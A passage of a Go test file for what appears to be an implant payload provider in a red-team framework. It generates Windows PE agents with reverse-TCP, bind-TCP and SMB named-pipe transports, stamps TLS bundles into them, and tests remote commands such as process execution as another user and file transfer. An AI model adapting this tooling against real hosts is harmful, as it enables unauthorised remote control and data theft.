	if got := binary.LittleEndian.Uint16(body[configOffset+payloadConfigPortOffset:]); got != 4444 {
		t.Fatalf("reverse port = %d", got)
	}
}

func TestProviderStampsCompleteTLSBundleIntoWindowsPE(t *testing.T) {
	now := time.Now().UTC().Truncate(time.Second)
	bundle, _ := testSquatterTLSBundle(t, now)
	bundle.AssignmentID = "squatter-payload-assignment"
	encodedBundle, err := json.Marshal(bundle)
	if err != nil {
		t.Fatal(err)
	}
	generated, err := newProvider().GeneratePayload(hovel.GeneratePayloadRequest{
		PayloadID: "squatter/windows/x86/windows-7/tcp-bind/pe-exe",
		Target:    "127.0.0.1",
		Format:    formatPEEXE,
		Config:    map[string]string{"payload.bind_port": "19100"},
	})
	if err != nil {
		t.Fatal(err)
	}
	body, err := base64.StdEncoding.DecodeString(generated.Primary.Bytes)
	if err != nil {
		t.Fatal(err)
	}
	inputDigest := sha256.Sum256(body)
	bundleDigest := sha256.Sum256(encodedBundle)
	inputContent, err := hovel.NewCredentialArtifactData(body)
	if err != nil {
		t.Fatal(err)
	}
	materialBytes, err := hovel.NewCredentialMaterialBytes(encodedBundle)
	if err != nil {
		t.Fatal(err)
	}
	resolved, err := hovel.NewResolvedCredentialMaterial(
		hovel.CredentialProjectionBundle,
		hovel.CredentialMaterialPrivateBytes,
		hovel.CredentialEncodingJSON,
		hex.EncodeToString(bundleDigest[:]),
		materialBytes,
	)
	if err != nil {
		t.Fatal(err)
	}
	target := hovel.CredentialStampTarget{
		Kind: hovel.CredentialStampTargetNamedSlot,
		NamedSlot: &hovel.CredentialNamedSlotTarget{
			Name: payloadTLSCredentialSlot,
		},
	}
	request := hovel.CredentialStampExecutionRequest{
		SchemaVersion: hovel.CredentialProviderExecutionSchemaV1,
		Provider: hovel.CredentialProviderTarget{
			ModuleID:         payloadName + "@" + version,
			ProviderID:       payloadName,
			ProviderVersion:  version,
			DescriptorSHA256: strings.Repeat("1", sha256.Size*2),
		},
		StampID: "squatter-payload-tls-stamp",
		Request: hovel.CredentialStampRequest{
			AssignmentID: bundle.AssignmentID,
			Capability:   hovel.CredentialDeliveryStampStandard,
			SlotName:     payloadTLSCredentialSlot,
			Target:       target,
			Material: hovel.CredentialStampMaterial{
				Projection: hovel.CredentialProjectionBundle,
				Credential: &hovel.CredentialMaterialReference{
					Projection: hovel.CredentialProjectionBundle,
					Form:       hovel.CredentialMaterialPrivateBytes,
					BundleID:   bundle.ID,
				},
			},
			EncodedBytes: uint64(len(encodedBundle)),
			Credential: hovel.ResolvedCredentialMetadata{
				BundleVersion:         hovel.CredentialBundleSchemaV1,
				Purpose:               hovel.CredentialPurposeTLSServer,
				ConsumerType:          hovel.CredentialConsumerPayload,
				ProfileID:             "tls-server",
				CompatibilityTargetID: "portable-x509",
			},
		},
		Input: hovel.CredentialArtifactInput{
			ID:       "squatter-transport-configured-pe",
			SHA256:   hex.EncodeToString(inputDigest[:]),
			Encoding: "binary",
			Content:  inputContent,
		},
		Material: resolved,
		ExpectedDigests: []hovel.CredentialStampedMaterialDigest{{
			Projection: hovel.CredentialProjectionBundle,
			Reference:  bundle.ID,
			SHA256:     hex.EncodeToString(bundleDigest[:]),
		}},
		Scope: hovel.CredentialOperationScope{
			OperationID: "squatter-payload-stamp-operation",
			Target:      "127.0.0.1",
		},
	}
	result, err := newProvider().StampCredential(request)
	if err != nil {
		t.Fatal(err)
	}
	if err := result.ValidateFor(request); err != nil {
		t.Fatal(err)
	}
	artifact, ok := result.Output.Artifact()
	if !ok || artifact.Name != "squatter-stamped.exe" {
		t.Fatalf("stamp output = %#v", result.Output)
	}
	stamped, ok := artifact.Content.Data()
	if !ok {
		t.Fatal("stamp output did not contain in-memory PE bytes")
	}
	extracted, digest, err := stampedPayloadBundle(stamped)
	if err != nil {
		t.Fatal(err)
	}
	defer clear(extracted)
	if !bytes.Equal(extracted, encodedBundle) || digest != hex.EncodeToString(bundleDigest[:]) {
		t.Fatal("stamped payload did not preserve the complete PKI bundle")
	}
	if bytes.Equal(stamped, body) {
		t.Fatal("credential stamping did not change the generated PE")
	}
	pkiOffset, err := payloadPKIConfigOffset(stamped)
	if err != nil {
		t.Fatal(err)
	}
	stamped[pkiOffset+payloadPKIBundleOffset] ^= 0xff
	if _, _, err := stampedPayloadBundle(stamped); err == nil {
		t.Fatal("tampered stamped payload bundle passed integrity validation")
	}
}

func TestProviderPatchesPayloadConfigFromListener(t *testing.T) {
	generated, err := newProvider().GeneratePayload(hovel.GeneratePayloadRequest{
		Target:    "target-1",
		PayloadID: "squatter/windows/x86/windows-7/reverse-tcp/pe-exe",
		Format:    "pe-exe",
		Config:    map[string]string{"payload.transport": tcpCallback, "payload.lhost": "10.1.2.3", "payload.lport": "1"},
		Listener:  &hovel.ListenerRef{Host: "127.0.0.1", Port: 31337},
	})
	if err != nil {
		t.Fatal(err)
	}
	body, err := base64.StdEncoding.DecodeString(generated.Primary.Bytes)
	if err != nil {
		t.Fatal(err)
	}
	configOffset := mustPayloadConfigOffset(t, body)
	if got := binary.LittleEndian.Uint16(body[configOffset+payloadConfigPortOffset:]); got != 31337 {
		t.Fatalf("reverse port = %d", got)
	}
}

func TestProviderPatchesTCPBindPayloadConfig(t *testing.T) {
	generated, err := newProvider().GeneratePayload(hovel.GeneratePayloadRequest{
		Target:    "target-1",
		PayloadID: "squatter/windows/x86/windows-7/tcp-bind/pe-exe",
		Format:    "pe-exe",
		Config:    map[string]string{"payload.transport": tcpBind, "payload.bind_port": "19100"},
	})
	if err != nil {
		t.Fatal(err)
	}
	body, err := base64.StdEncoding.DecodeString(generated.Primary.Bytes)
	if err != nil {
		t.Fatal(err)
	}
	configOffset := mustPayloadConfigOffset(t, body)
	if got := binary.LittleEndian.Uint32(body[configOffset+payloadConfigKindOffset:]); got != payloadConfigKindTCPBind {
		t.Fatalf("transport kind = %d", got)
	}
	if got := binary.LittleEndian.Uint16(body[configOffset+payloadConfigPortOffset:]); got != 19100 {
		t.Fatalf("bind port = %d", got)
	}
}

func TestProviderPatchesSMBNamedPipePayloadConfig(t *testing.T) {
	generated, err := newProvider().GeneratePayload(hovel.GeneratePayloadRequest{
		Target:    "target-1",
		PayloadID: "squatter/windows/x86/windows-7/smb-named-pipe/pe-exe",
		Format:    "pe-exe",
		Config:    map[string]string{"payload.transport": smbNamedPipe, "payload.pipe": "hovel-squatter-target-1"},
	})
	if err != nil {
		t.Fatal(err)
	}
	body, err := base64.StdEncoding.DecodeString(generated.Primary.Bytes)
	if err != nil {
		t.Fatal(err)
	}
	configOffset := mustPayloadConfigOffset(t, body)
	if got := binary.LittleEndian.Uint32(body[configOffset+payloadConfigKindOffset:]); got != payloadConfigKindSMBPipe {
		t.Fatalf("transport kind = %d", got)
	}
	if !bytes.Contains(body[configOffset:], []byte{'h', 0, 'o', 0, 'v', 0, 'e', 0, 'l', 0}) {
		t.Fatal("patched payload does not contain UTF-16LE pipe name")
	}
}

func TestPayloadConfigOffsetSkipsNonConfigMarker(t *testing.T) {
	body := make([]byte, 512)
	copy(body, []byte("SQCFG001-not-the-runtime-config"))
	configOffset := 128
	copy(body[configOffset:], []byte(payloadConfigMagic))
	binary.LittleEndian.PutUint32(body[configOffset+payloadConfigKindOffset:], payloadConfigKindSMBPipe)
	writeUTF16At(body, configOffset+payloadConfigPipeOffset, `\\.\pipe\squatter`)

	offset, err := payloadConfigOffset(body)
	if err != nil {
		t.Fatal(err)
	}
	if offset != configOffset {
		t.Fatalf("config offset = %d, want %d", offset, configOffset)
	}
}

func TestPayloadBinaryCandidatesIncludeInstalledPackagePayload(t *testing.T) {
	root := t.TempDir()
	exe := filepath.Join(root, "bin", "linux-amd64", "squatter-provider")
	want := filepath.Join(root, "bin", "squatter.exe")
	for _, candidate := range payloadBinaryCandidates("", exe) {
		if candidate == want {
			return
		}
	}
	t.Fatalf("payload candidates missing %s", want)
}

func TestProviderNormalizesRemoteSMBPipePathForPayload(t *testing.T) {
	got := normalizeNamedPipe(`\\target-1\pipe\hovel-squatter-target-1`)
	if want := `\\.\pipe\hovel-squatter-target-1`; got != want {
		t.Fatalf("pipe = %q, want %q", got, want)
	}
}

func TestProviderSatisfiesPayloadProviderRPCContract(t *testing.T) {
	hoveltest.AssertPayloadProviderContract(t, newProvider(), hoveltest.PayloadProviderContract{
		Query: hovel.PayloadQuery{
			Transport: tcpCallback,
			Format:    formatPEEXE,
		},
		Target:        "target-1",
		RunID:         "run-1",
		Config:        map[string]string{"payload.transport": reverseTCP, "payload.lhost": "127.0.0.1", "payload.lport": "0"},
		WantKind:      string(hovel.PayloadKindPE),
		WantFormat:    formatPEEXE,
		WantTransport: tcpCallback,
		WantTags:      []string{"pe", "windows"},
		WantCapabilities: []string{
			"host.info",
			"file.get",
			"file.put",
			"file.stat",
			"file.hash",
			"registry.query",
			"eventlog.query",
			"drive.list",
			"share.list",
			"acl.stat",
			"process.exec",
			"process.exec.as_user",
			"process.run",
			"process.list",
			"process.tasklist",
			"process.kill",
			"payload.status",
			"payload.cleanup",
		},
	})
}

func TestProviderPayloadCommandCatalogueIsTruthful(t *testing.T) {
	commands, err := newProvider().ListPayloadCommands(hovel.PayloadCommandListRequest{})
	if err != nil {
		t.Fatal(err)
	}
	byName := map[string]hovel.PayloadCommand{}
	for _, command := range commands {
		byName[command.Name] = command
		for _, capability := range command.Capabilities {
			if capability == "library.rundll" {
				t.Fatalf("unsafe unimplemented capability advertised by %s", command.Name)
			}
		}
	}
	for _, name := range []string{
		"wininfo",
		"process.list",
		"process.run",
		"process.run_as_user",
		"process.kill",
		"payload.status",
		"payload.cleanup",
		"file.stat",
		"registry.query",
		"eventlog.query",
		"drive.list",
		"share.list",
		"acl.stat",
		"getfile",
		"putfile",
		"cmd",
	} {
		if _, ok := byName[name]; !ok {
			t.Fatalf("payload command %s not advertised in %#v", name, commands)
		}
	}
	if !byName["wininfo"].ReadOnly || !byName["process.list"].ReadOnly || !byName["payload.status"].ReadOnly {
		t.Fatalf("read-only commands misclassified: %#v", byName)
	}
	if !byName["process.run"].Destructive || !byName["process.run_as_user"].Destructive || !byName["process.kill"].Destructive || !byName["payload.cleanup"].Destructive {
		t.Fatalf("destructive commands misclassified: %#v", byName)
	}
	if !slicesContain(byName["process.list"].Capabilities, "process.tasklist") {
		t.Fatalf("process.list capabilities = %#v, want process.tasklist alias", byName["process.list"].Capabilities)
	}
	if !slicesContain(byName["process.run_as_user"].Capabilities, "process.exec.as_user") {
		t.Fatalf("process.run_as_user capabilities = %#v, want process.exec.as_user", byName["process.run_as_user"].Capabilities)
	}
}

func TestRunProcessRunCommandParsesTypedResult(t *testing.T) {
	clientConn, serverConn := net.Pipe()
	defer closeTestConn(t, "client connection", clientConn)
	defer closeTestConn(t, "server connection", serverConn)

	done := make(chan error, 1)
	go func() {
		kind, streamID, payload, err := wire.ReadFrame(serverConn)
		if err != nil {
			done <- err
			return
		}
		if kind != wire.KindOpen || streamID != 1 || !bytes.Contains(payload, []byte("process.run")) {
			done <- fmt.Errorf("open frame kind=%d stream=%d payload=%q", kind, streamID, payload)
			return
		}
		body := []byte(`{"command":"hostname","pid":42,"exitCode":0,"timedOut":false,"stdout":"host\r\n","stderr":""}`)
		if err := wire.WriteFrame(serverConn, wire.KindData, 1, body); err != nil {
			done <- err
			return
		}
		if err := wire.WriteFrame(serverConn, wire.KindControl, 1, wire.EncodeStreamEvent(wire.StreamEvent{Kind: wire.EventExited, Code: 0})); err != nil {
			done <- err
			return
		}
		done <- wire.WriteFrame(serverConn, wire.KindClose, 1, nil)
	}()

	result, err := runProcessRunCommand(clientConn, bufio.NewReader(clientConn), 1, hovel.PayloadCommandRequest{
		Command: "process.run",
		Args:    []string{"hostname", "1000"},
	})
	if err != nil {
		t.Fatal(err)
	}
	if err := <-done; err != nil {
		t.Fatal(err)
	}
	if result.Stdout != "host\r\n" || result.Stderr != "" || result.Fields["pid"] != "42" || result.Fields["exitCode"] != "0" {
		t.Fatalf("process.run result = %#v", result)
	}
}

func TestRunProcessRunAsUserCommandParsesTypedResult(t *testing.T) {
	clientConn, serverConn := net.Pipe()
	defer closeTestConn(t, "client connection", clientConn)
	defer closeTestConn(t, "server connection", serverConn)

	done := make(chan error, 1)
	go func() {
		kind, streamID, payload, err := wire.ReadFrame(serverConn)
		if err != nil {
			done <- err
			return
		}
		if kind != wire.KindOpen || streamID != 1 || !bytes.Contains(payload, []byte("process.run_as_user")) {
			done <- fmt.Errorf("open frame kind=%d stream=%d payload=%q", kind, streamID, payload)
			return
		}
		body := []byte(`{"pid":43,"sourcePid":1364,"sessionId":0,"command":"C:\\WINDOWS\\explorer.exe","cwd":"C:\\WINDOWS","usedEnvironment":true}`)
		if err := wire.WriteFrame(serverConn, wire.KindData, 1, body); err != nil {
			done <- err
			return
		}
		done <- wire.WriteFrame(serverConn, wire.KindClose, 1, nil)
	}()

	result, err := runPayloadCommandOnTransport(clientConn, bufio.NewReader(clientConn), 1, hovel.PayloadCommandRequest{
		Command: "process.run_as_user",
		Args:    []string{`C:\WINDOWS\explorer.exe`, `C:\WINDOWS`, "1364"},
	})
	if err != nil {
		t.Fatal(err)
	}
	if err := <-done; err != nil {
		t.Fatal(err)
	}
	if result.Summary != "process launched as interactive user" || result.Fields["pid"] != "43" || result.Fields["sourcePid"] != "1364" || result.Fields["sessionId"] != "0" {
		t.Fatalf("process.run_as_user result = %#v", result)
	}
}

func slicesContain(values []string, want string) bool {
	for _, value := range values {
		if value == want {
			return true
		}
	}
	return false
}

func TestRunGetfileCommandReturnsBinaryFileArtifact(t *testing.T) {
	clientConn, serverConn := net.Pipe()
	defer closeTestConn(t, "client connection", clientConn)
	defer closeTestConn(t, "server connection", serverConn)

	want := []byte{0x4d, 0x5a, 0x00, 0xff, 0xfe, 0x80}
	done := make(chan error, 1)
	go func() {
		kind, streamID, _, err := wire.ReadFrame(serverConn)
		if err != nil {
			done <- err
			return
		}
		if kind != wire.KindOpen || streamID != 1 {
			done <- fmt.Errorf("open frame kind=%d stream=%d", kind, streamID)
			return
		}
		if err := wire.WriteFrame(serverConn, wire.KindData, 1, append([]byte{'S'}, []byte("OK 6")...)); err != nil {
			done <- err
			return
		}
		if err := wire.WriteFrame(serverConn, wire.KindData, 1, append([]byte{'D'}, want...)); err != nil {
			done <- err
			return
		}
		if err := wire.WriteFrame(serverConn, wire.KindData, 1, []byte{'E'}); err != nil {
			done <- err
			return
		}
		done <- wire.WriteFrame(serverConn, wire.KindClose, 1, nil)
	}()

	result, err := runGetfileCommand(clientConn, bufio.NewReader(clientConn), 1, hovel.PayloadCommandRequest{Args: []string{`C:\Temp\payload.exe`}})
	if err != nil {
		t.Fatal(err)
	}
	if err := <-done; err != nil {
		t.Fatal(err)
	}
	if len(result.Artifacts) != 1 || result.Artifacts[0].Data != "" || result.Artifacts[0].Path == "" {
		t.Fatalf("artifact = %#v, want file artifact without inline data", result.Artifacts)
	}
	t.Cleanup(func() {
		if err := os.Remove(result.Artifacts[0].Path); err != nil {
			t.Logf("remove materialized artifact: %v", err)
		}
	})
	got, err := os.ReadFile(result.Artifacts[0].Path)
	if err != nil {
		t.Fatal(err)
	}
	if !bytes.Equal(got, want) {
		t.Fatalf("artifact bytes = %x, want %x", got, want)
	}
}

func TestSquatterSessionRunsPayloadCommandOnExistingConnection(t *testing.T) {
	clientConn, serverConn := net.Pipe()
	defer closeTestConn(t, "client connection", clientConn)
	defer closeTestConn(t, "server connection", serverConn)

	session := &squatterSession{client: shell.New(clientConn)}
	done := make(chan error, 1)
	go func() {
		kind, streamID, payload, err := wire.ReadFrame(serverConn)
		if err != nil {
			done <- err
			return
		}
		if kind != wire.KindOpen {
			done <- fmt.Errorf("frame kind=%d, want open", kind)
			return
		}
		if streamID == 0 {
			done <- fmt.Errorf("stream ID must be non-zero")
			return
		}
		if !bytes.Contains(payload, []byte("process.list")) {
			done <- fmt.Errorf("open payload %x does not contain process.list", payload)
			return
		}
		if err := wire.WriteFrame(serverConn, wire.KindData, streamID, []byte("[]")); err != nil {
			done <- err
			return
		}
		done <- wire.WriteFrame(serverConn, wire.KindClose, streamID, nil)
	}()

	result, err := session.RunPayloadCommand(hovel.PayloadCommandRequest{Command: "process.list"})
	if err != nil {
		t.Fatal(err)
	}
	if err := <-done; err != nil {
		t.Fatal(err)
	}
	if result.Command != "process.list" || result.Stdout != "[]" {
		t.Fatalf("result = %#v, want process.list output", result)
	}
}

func TestPlaceholderLPReverseTCPPreparesListener(t *testing.T) {
	lp := newPlaceholderLP()
	provider := Provider{lp: lp}
	listener, err := provider.PrepareListener(hovel.PrepareListenerRequest{
		RunID:     "run-1",
		Target:    "target-1",
		PayloadID: "squatter/windows/x86/windows-7/reverse-tcp/pe-exe",
		Config:    map[string]string{"payload.transport": tcpCallback, "payload.lhost": "127.0.0.1", "payload.lport": "0"},
	})
	if err != nil {
		t.Fatal(err)
	}
	defer func() {
		if _, err := provider.CleanupPayload(hovel.CleanupPayloadRequest{Target: "target-1", Reason: "test"}); err != nil {
			t.Logf("cleanup payload: %v", err)
		}
	}()
	if listener.Transport != "squatter/tcp-callback" || listener.Host != "127.0.0.1" || listener.Port == 0 {
		t.Fatalf("listener = %#v", listener)
	}
	if _, ok := lp.listener("target-1"); !ok {
		t.Fatal("listener was not recorded in placeholder LP")
	}
}

func TestPlaceholderLPReverseTCPAcceptsCallback(t *testing.T) {
	lp := newPlaceholderLP()
	provider := Provider{lp: lp}
	listener, err := provider.PrepareListener(hovel.PrepareListenerRequest{
		RunID:     "run-1",
		Target:    "target-1",
		PayloadID: "squatter/windows/x86/windows-7/reverse-tcp/pe-exe",
		Config:    map[string]string{"payload.transport": tcpCallback, "payload.lhost": "127.0.0.1", "payload.lport": "0"},
	})
	if err != nil {
		t.Fatal(err)
	}
	defer func() {
		if _, err := provider.CleanupPayload(hovel.CleanupPayloadRequest{Target: "target-1", Reason: "test"}); err != nil {
			t.Logf("cleanup payload: %v", err)
		}
	}()

	conn, err := net.Dial("tcp", net.JoinHostPort(listener.Host, strconv.Itoa(listener.Port)))
	if err != nil {
		t.Fatal(err)
	}
	defer closeTestConn(t, "connection", conn)
	if _, err := conn.Write([]byte{'S', 'Q', 'U', 'A', 'T', 'T', 'E', 'R', 0x01, 0x00, 0x00, 0x00}); err != nil {
		t.Fatal(err)
	}

	session, err := provider.ConnectSession(hovel.ConnectSessionRequest{
		RunID:     "run-1",
		Target:    "target-1",
		PayloadID: "squatter/windows/x86/windows-7/tcp-callback/pe-exe",
		Config:    map[string]string{"payload.transport": tcpCallback},
	})
	if err != nil {
		t.Fatal(err)
	}
	if session.Transport != "squatter/tcp-callback" || session.State != "open" {
		t.Fatalf("session = %#v", session)
	}
}

func TestPlaceholderLPTCPBindConnectsProviderOwnedSession(t *testing.T) {
	listener, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	defer closeTestListener(t, listener)
	accepted := make(chan net.Conn, 1)
	go func() {
		conn, err := listener.Accept()
		if err == nil {
			accepted <- conn
		}
	}()

	lp := newPlaceholderLP()
	provider := Provider{lp: lp}
	port := listener.Addr().(*net.TCPAddr).Port
	session, err := provider.ConnectSession(hovel.ConnectSessionRequest{
		RunID:     "run-1",
		Target:    "127.0.0.1",
		PayloadID: "squatter/windows/x86/windows-7/tcp-bind/pe-exe",
		Config: map[string]string{
			"payload.transport": tcpBind,
			"payload.bind_port": strconv.Itoa(port),
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	defer func() {
		if _, err := provider.CleanupPayload(hovel.CleanupPayloadRequest{Target: "127.0.0.1", Reason: "test"}); err != nil {
			t.Logf("cleanup payload: %v", err)
		}
	}()
	if session.Transport != "squatter/tcp-bind" || session.Kind != "agent" || session.State != "open" {
		t.Fatalf("session = %#v", session)
	}
	select {
	case conn := <-accepted:
		closeTestConn(t, "accepted connection", conn)
	case <-time.After(time.Second):
		t.Fatal("bind listener did not receive provider connection")
	}
}

func TestPlaceholderLPTCPBindReconnectUsesProviderRecord(t *testing.T) {
	listener, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	defer closeTestListener(t, listener)
	accepted := make(chan net.Conn, 1)
	go func() {
		conn, err := listener.Accept()
		if err == nil {
			accepted <- conn
		}
	}()

	lp := newPlaceholderLP()
	provider := Provider{lp: lp}
	port := listener.Addr().(*net.TCPAddr).Port
	session, err := provider.ConnectSession(hovel.ConnectSessionRequest{
		RunID:              "run-1",
		InstalledPayloadID: "p1",
		PayloadID:          "squatter/windows/x86/windows-7/tcp-bind/pe-exe",
		Reconnect: &hovel.PayloadProviderRecord{
			ProviderID:    payloadName,
			Schema:        "squatter.tcp_bind.reconnect",
			SchemaVersion: "v1",
			Descriptor:    map[string]any{"transport": tcpBind, "host": "127.0.0.1", "port": float64(port)},
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	defer func() {
		if _, err := provider.CleanupPayload(hovel.CleanupPayloadRequest{Target: "127.0.0.1", Reason: "test"}); err != nil {
			t.Logf("cleanup payload: %v", err)
		}
	}()
	if session.InstalledPayloadID != "p1" || session.Transport != "squatter/tcp-bind" || session.State != "open" {
		t.Fatalf("session = %#v", session)
	}
	select {
	case conn := <-accepted:
		closeTestConn(t, "accepted connection", conn)
	case <-time.After(time.Second):
		t.Fatal("bind listener did not receive provider connection")
	}
}

func TestPlaceholderLPSMBConnectsProviderOwnedSession(t *testing.T) {
	connector := &fakeSMBConnector{conn: noopReadWriteCloser{}}
	lp := newPlaceholderLP()
	lp.smb = connector
	provider := Provider{lp: lp}
	session, err := provider.ConnectSession(hovel.ConnectSessionRequest{
		RunID:     "run-1",
		Target:    "target-1",
		PayloadID: "squatter/windows/x86/windows-7/smb-named-pipe/pe-exe",
		Config: map[string]string{
			"payload.transport": smbNamedPipe,
			"payload.pipe":      "pipe123",
			"smb.username":      "user123",
			"smb.password":      "pass123",
			"smb.domain":        "LAB",
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	if session.Transport != "squatter/smb-named-pipe" || session.Kind != "agent" || session.State != "open" {
		t.Fatalf("session = %#v", session)
	}
	if len(connector.requests) != 1 {
		t.Fatalf("smb connector requests = %#v, want one", connector.requests)
	}
	request := connector.requests[0]
	if request.Host != "target-1" || request.Pipe != "pipe123" || request.Username != "user123" || request.Password != "pass123" || request.Domain != "LAB" {
		t.Fatalf("smb connector request = %#v", request)
	}
	if _, ok := lp.session("target-1"); !ok {
		t.Fatal("session was not recorded in placeholder LP")
	}
	cleanup, err := provider.CleanupPayload(hovel.CleanupPayloadRequest{Target: "target-1", Reason: "test"})
	if err != nil {
		t.Fatal(err)
	}
	if cleanup.Status != "ok" {
		t.Fatalf("cleanup = %#v", cleanup)
	}
	if _, ok := lp.session("target-1"); ok {
		t.Fatal("session was not removed during cleanup")
	}
}

func TestPlaceholderLPSMBReconnectUsesProviderRecord(t *testing.T) {
	connector := &fakeSMBConnector{conn: noopReadWriteCloser{}}
	lp := newPlaceholderLP()
	lp.smb = connector
	provider := Provider{lp: lp}
	session, err := provider.ConnectSession(hovel.ConnectSessionRequest{
		RunID:              "run-1",
		InstalledPayloadID: "p1",
		PayloadID:          "squatter/windows/x86/windows-7/smb-named-pipe/pe-exe",
		Reconnect: &hovel.PayloadProviderRecord{
			ProviderID:    payloadName,
			Schema:        "squatter.smb_named_pipe.reconnect",
			SchemaVersion: "v1",
			Descriptor: map[string]any{
				"transport":    smbNamedPipe,
				"target.host":  "target-1",
				"payload.pipe": "pipe123",
				"smb.username": "user123",
				"smb.password": "pass123",
				"smb.domain":   "LAB",
			},
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	if session.InstalledPayloadID != "p1" || session.Transport != "squatter/smb-named-pipe" || session.State != "open" {
		t.Fatalf("session = %#v", session)
	}
	if len(connector.requests) != 1 {
		t.Fatalf("smb connector requests = %#v, want one", connector.requests)
	}
	request := connector.requests[0]
	if request.Host != "target-1" || request.Pipe != "pipe123" || request.Username != "user123" || request.Password != "pass123" || request.Domain != "LAB" {
		t.Fatalf("smb connector request = %#v", request)
	}
}

func TestProviderRunOpensPrettyPTYSessionOverJSONRPC(t *testing.T) {
	clientConn, serverConn := net.Pipe()
	defer closeTestConn(t, "server connection", serverConn)

	lp := newPlaceholderLP()
	lp.smb = &fakeSMBConnector{conn: clientConn}
	rpc := hoveltest.NewRPCConn(t, Provider{lp: lp})
	defer rpc.Close()

	var result struct {
		Status   string             `json:"status"`
		Sessions []hovel.SessionRef `json:"sessions"`
	}
	rpc.Call("execute", map[string]any{
		"runId":    "run-1",
		"moduleId": "squatter",
		"target":   "target-1",
		"chainConfig": map[string]any{
			"payload.transport": smbNamedPipe,
			"payload.pipe":      "pipe123",
			"smb.username":      "user123",
			"smb.password":      "pass123",
		},
		"targetConfig": map[string]any{
			"target.host": "target-1",
		},
	}, &result)
	if result.Status != "succeeded" || len(result.Sessions) != 1 {
		t.Fatalf("execute result = %#v", result)
	}
	sessionID := result.Sessions[0].ID
	banner := readRPCSessionUntil(t, rpc, sessionID, "sq>", 2*time.Second)
	if !strings.Contains(banner, "squatterctl") || !strings.Contains(banner, "tab completes commands") {
		t.Fatalf("session banner = %q, want pretty squatterctl banner and prompt", banner)
	}

	writeRPCSession(t, rpc, sessionID, "help\n")
	help := readRPCSessionUntil(t, rpc, sessionID, "putfile", 2*time.Second)
	if !strings.Contains(help, "commands") || !strings.Contains(help, "putfile") {
		t.Fatalf("help output = %q, want squatterctl help", help)
	}

	writeRPCSession(t, rpc, sessionID, "\t")
	completion := readRPCSessionUntil(t, rpc, sessionID, "open cmd.exe", 2*time.Second)
	if !strings.Contains(completion, "cmd") || !strings.Contains(completion, "echo") {
		t.Fatalf("completion output = %q, want squatterctl suggestions", completion)
	}

	var closeResult struct {
		Status string `json:"status"`
	}
	rpc.Call("session/close", map[string]any{"sessionId": sessionID, "reason": "test"}, &closeResult)
	if closeResult.Status != "ok" {
		t.Fatalf("close result = %#v", closeResult)
	}
}

func TestProviderExecuteConnectTCPBindProducesSessionCapability(t *testing.T) {
	listener, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	defer closeTestListener(t, listener)
	accepted := make(chan net.Conn, 1)
	go func() {
		conn, err := listener.Accept()
		if err == nil {
			accepted <- conn
		}
	}()
	port := listener.Addr().(*net.TCPAddr).Port

	result, err := newProvider().ExecuteStep(hovel.StepExecuteRequest{
		RunID:  "run-1",
		StepID: "squatter.connect_tcp_bind",
		RunMetadata: map[string]any{
			"config": map[string]any{
				"target.host":        "127.0.0.1",
				"payload.transport":  tcpBind,
				"payload.bind_port":  strconv.Itoa(port),
				"session.connect_ms": "1000",
			},
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	if result.Status != "succeeded" {
		t.Fatalf("status = %q", result.Status)
	}
	if len(result.Capabilities) != 1 || result.Capabilities[0].Type != hovel.CapabilitySessionRef {
		t.Fatalf("capabilities = %#v, want SessionRef", result.Capabilities)
	}
	if len(result.Sessions) != 1 || result.Sessions[0].Transport != "squatter/tcp-bind" {
		t.Fatalf("sessions = %#v, want tcp-bind session", result.Sessions)
	}
	if result.Capabilities[0].Attributes["transport"] != tcpBind {
		t.Fatalf("session capability attributes = %#v", result.Capabilities[0].Attributes)
	}
	select {
	case conn := <-accepted:
		closeTestConn(t, "accepted connection", conn)
	case <-time.After(time.Second):
		t.Fatal("bind listener did not receive provider connection")
	}
}

func TestProviderExecuteTCPCallbackAdoptsAcceptedConnection(t *testing.T) {
	provider := newProvider()
	listen, err := provider.ExecuteStep(hovel.StepExecuteRequest{
		RunID:  "run-1",
		StepID: "squatter.listen_tcp_callback",
		RunMetadata: map[string]any{
			"config": map[string]any{
				"target.host":       "target-1",
				"payload.transport": tcpCallback,
				"payload.lhost":     "127.0.0.1",
				"payload.lport":     "0",
			},
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	if listen.Status != "succeeded" || len(listen.Capabilities) == 0 {
		t.Fatalf("listen result = %#v", listen)
	}
	portText, ok := listen.Capabilities[0].Attributes["port"].(string)
	if !ok || portText == "" {
		t.Fatalf("listener capability = %#v", listen.Capabilities[0])
	}
	port, err := strconv.Atoi(portText)
	if err != nil {
		t.Fatal(err)
	}
	conn, err := net.Dial("tcp", net.JoinHostPort("127.0.0.1", strconv.Itoa(port)))
	if err != nil {
		t.Fatal(err)
	}
	defer closeTestConn(t, "connection", conn)
	if _, err := conn.Write([]byte{'S', 'Q', 'U', 'A', 'T', 'T', 'E', 'R', 0x01, 0x00, 0x00, 0x00}); err != nil {
		t.Fatal(err)
	}

	connect, err := provider.ExecuteStep(hovel.StepExecuteRequest{
		RunID:  "run-1",
		StepID: "squatter.connect_tcp_callback",
		RunMetadata: map[string]any{
			"config": map[string]any{
				"target.host":       "target-1",
				"payload.transport": tcpCallback,
			},
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	if connect.Status != "succeeded" {
		t.Fatalf("connect result = %#v", connect)
	}
	if len(connect.Capabilities) != 1 || connect.Capabilities[0].Attributes["transport"] != tcpCallback {
		t.Fatalf("session capability = %#v", connect.Capabilities)
	}
	if len(connect.Sessions) != 1 || connect.Sessions[0].Transport != "squatter/tcp-callback" {
		t.Fatalf("sessions = %#v, want tcp-callback session", connect.Sessions)
	}
}

func TestProviderExecuteConnectSMBProducesSessionCapability(t *testing.T) {
	connector := &fakeSMBConnector{conn: noopReadWriteCloser{}}
	lp := newPlaceholderLP()
	lp.smb = connector
	provider := Provider{lp: lp}

	result, err := provider.ExecuteStep(hovel.StepExecuteRequest{
		RunID:  "run-1",
		StepID: "squatter.connect_smb",
		RunMetadata: map[string]any{
			"config": map[string]any{
				"target.host":       "192.0.2.20",
				"payload.transport": smbNamedPipe,
				"payload.pipe":      "pipe123",
